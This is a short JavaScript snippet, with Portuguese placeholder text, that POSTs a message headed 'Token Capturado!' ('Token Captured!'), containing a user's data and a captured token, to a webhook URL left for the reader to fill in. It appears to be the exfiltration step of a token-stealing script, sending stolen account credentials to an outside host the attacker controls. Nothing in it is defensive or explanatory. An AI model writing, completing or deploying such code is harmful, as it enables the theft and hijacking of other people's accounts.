fetch('SUA_URL_DO_WEBHOOK_AQUI', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: `Token Capturado! \nUsuário: ${userData} \nToken: ${capturedToken}`
    })
});
